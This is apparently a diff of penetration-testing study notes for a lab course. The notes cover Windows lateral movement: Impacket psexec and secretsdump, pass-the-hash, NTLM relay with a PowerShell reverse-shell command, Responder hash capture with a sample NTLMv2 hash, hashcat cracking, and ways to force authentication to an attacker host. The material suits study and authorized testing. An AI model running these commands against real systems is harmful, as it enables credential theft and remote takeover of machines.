@@ -275,7 +275,7 @@ After getting admin/SYSTEM on a Windows box, run Mimikatz to extract credentials
 
 ---
 
-## Impacket
+## Impacket-psexec
 
 **Impacket** — a collection of Python tools for interacting with Windows network protocols. It's your Swiss army knife for attacking Windows machines from Kali.
 
@@ -286,7 +286,7 @@ After getting admin/SYSTEM on a Windows box, run Mimikatz to extract credentials
 impacket-psexec Administrator:password@192.168.177.212
 
 # With NTLM hash (Pass-the-Hash)
-impacket-psexec Administrator@192.168.177.212 -hashes :7a38310ea6f0027ee955abed1762964b
+impacket-psexec Administrator@<ip.addr> -hashes :<hash>
 ```
 
 It works by uploading a service binary to the target via SMB, creating a Windows service, and executing it — giving you a SYSTEM shell.
@@ -295,10 +295,10 @@ It works by uploading a service binary to the target via SMB, creating a Windows
 
 ```bash
 # Remote shell (similar to psexec, different method)
-impacket-wmiexec Administrator@target -hashes :hash
+impacket-wmiexec Administrator@target -hashes :<hash>
 
 # Dump credentials remotely without touching the target
-impacket-secretsdump Administrator@target -hashes :hash
+impacket-secretsdump Administrator@target -hashes :<hash>
 
 # MSSQL client
 impacket-mssqlclient sa:password@target -windows-auth
@@ -306,14 +306,145 @@ impacket-mssqlclient sa:password@target -windows-auth
 # Kerberos attacks (AD)
 impacket-GetNPUsers domain/user -dc-ip target
 impacket-GetUserSPNs domain/user:password -dc-ip target
+
+# NTLMv2 Pass the hash RCE
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "<powershell base64 encoded revshell>"
 ```
 
-**Why Impacket matters:**
-It lets you do everything from Kali without uploading tools to the target. No need to transfer Mimikatz if you can run `secretsdump` remotely.
+### impacket-psexec requirements:
 
-**Key distinction:**
-- `psexec` → gives you a shell
-- `wmiexec` → gives you a shell (stealthier, no service created)
-- `secretsdump` → dumps credentials without a shell
+1. **Port 445 (SMB) must be open** on the target
+2. **Valid credentials** — either a password or NTLM hash
+3. **Admin privileges** — the user must be a local administrator on the target
+4. **Writable share** — psexec needs to upload a service binary, typically to `ADMIN$` or `C$` share
+5. **ADMIN$ share must be accessible** — this is the default admin share at `C:\Windows`
 
-These become essential in AD modules 22-24.
+
+**If psexec fails, try these alternatives in order:**
+
+```bash
+# wmiexec — uses WMI instead of SMB service creation
+impacket-wmiexec user:password@target
+
+# smbexec — similar to psexec but different execution method
+impacket-smbexec user:password@target
+
+# evil-winrm — uses WinRM (port 5985)
+evil-winrm -i target -u user -p password
+```
+
+**Common failure reasons:**
+- User is not local admin → access denied
+- AV blocks the uploaded service binary → try wmiexec instead
+- ADMIN$ share disabled → try smbexec
+- Port 445 filtered → try evil-winrm on port 5985
+
+---
+
+## Cracking NTLM hash
+
+
+**NTLMv1** - located in SAM file, mimikatz to extract it.
+```bash
+# -r represents rule textfile, not mandatory
+hashcat -m 1000 <hashfile> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
+```
+
+**NTLMv2** - Gained when accessing your ip via responder.
+```bash
+hashcat -m 5600 sam.hash /usr/share/wordlists/rockyou.txt --force
+``` 
+
+---
+
+## Responder 
+
+**Connecting to Responder**
+```bash
+sudo responder -I tun0 #your vpn
+```
+
+**Checking Logs** - if you missed the hash and it states "previously captured hash"
+```bash
+#identify which textfile it is
+ls /usr/share/responder/logs/
+
+#Read the textfile
+cat /usr/share/responder/logs/<filename>
+
+#Example of an NTLMv2 hash
+sam::MARKETINGWK01:398130d41253d78a:5DADB44E1ACF3134A111E2815130A5CD:010100000000000000DDFA6D7114DD01271C869D39D7C71E0000000002000800490039004200350001001E00570049004E002D004B003200350041003400430032003700560033004C0004003400570049004E002D004B003200350041003400430032003700560033004C002E0049003900420035002E004C004F00430041004C000300140049003900420035002E004C004F00430041004C000500140049003900420035002E004C004F00430041004C000700080000DDFA6D7114DD0106000400020000000800300030000000000000000000000000200000969CE39609A1300812FC10F0F490D71A2804DF4FD97B9A2C3F49641618F3F72C0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200350030000000000000000000
+```
+
+
+---
+
+## Pass-The-Hash (To other services)
+
+- `impacket` #mentioned above
+- `smbclient` #refer to module 6
+
+
+**NTLMv2 Pass the hash RCE**
+```bash
+impacket-ntlmrelayx --no-http-server -smb2support -t <ip.addr> -c "<powershell base64 encoded revshell>"
+
+#In victim's shell
+C:\Windows\system32>whoami
+whoami
+files01\files02admin
+
+C:\Windows\system32>dir \\<yourip>\anyname
+```
+
+---
+
+### impacket-ntlmrelayx reference
+
+**impacket-ntlmrelayx — quick reference**
+
+**Basic relay with command execution:**
+```bash
+impacket-ntlmrelayx --no-http-server -smb2support -t <target_ip> -c "command here"
+```
+
+**Relay to dump SAM hashes:**
+```bash
+impacket-ntlmrelayx --no-http-server -smb2support -t <target_ip>
+```
+Without `-c`, it automatically dumps the SAM database if relay succeeds.
+
+**Relay to multiple targets (from file):**
+```bash
+impacket-ntlmrelayx --no-http-server -smb2support -tf targets.txt -c "command"
+```
+
+**Key flags:**
+- `-t` — single target IP to relay to
+- `-tf` — file containing multiple target IPs
+- `-c` — command to execute on successful relay
+- `--no-http-server` — disable HTTP listener, SMB only
+- `-smb2support` — enable SMBv2 (always include this)
+- `-e` — execute a binary instead of a command
+- `-l` — directory to dump loot (SAM, secrets)
+
+**The attack flow:**
+```
+1. Start ntlmrelayx listening
+2. Trigger victim to authenticate to you (Responder, command injection, etc.)
+3. ntlmrelayx relays hash to target
+4. If user has admin on target → command executes or SAM dumps
+```
+
+**Requirements:**
+- SMB signing disabled on target
+- Relay to a DIFFERENT machine than the source
+- Captured user must have admin rights on the relay target
+
+**Common triggers to force authentication:**
+- Responder poisoning
+- Command injection: `dir \\your_kali_ip\share`
+- Upload `.scf` or `.url` file
+- XSS or SSRF pointing to your IP
+
+---
